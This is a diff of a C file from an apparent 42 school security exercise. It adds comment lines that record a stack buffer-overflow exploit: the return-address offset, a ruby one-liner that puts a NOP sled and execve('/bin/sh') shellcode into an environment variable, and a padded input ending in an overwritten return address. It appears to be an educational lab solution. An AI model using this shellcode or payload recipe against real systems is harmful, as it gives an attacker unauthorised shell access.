@@ -6,13 +6,19 @@
 /*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2021/04/22 16:08:59 by fcadet            #+#    #+#             */
-/*   Updated: 2021/04/23 12:12:39 by fcadet           ###   ########.fr       */
+/*   Updated: 2021/04/23 14:41:17 by fcadet           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
+
+//return from greetuser @ 72 + 4 = 76 bytes from s
+//export LANG=nl
+//export EXPLOIT=$(ruby -e 'print "\x90" * 128 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"')
+//EXPLOIT ~@ 0xbffff873 -> middle @ 0xbffff86a + 64 = 0xbffff8d7
+//ruby -e 'print "x" * 40 + " " + "x" * (32 - (13 - 4)) + "\xd7\xf8\xff\xbf"'
 
 unsigned int	language = 0;
 
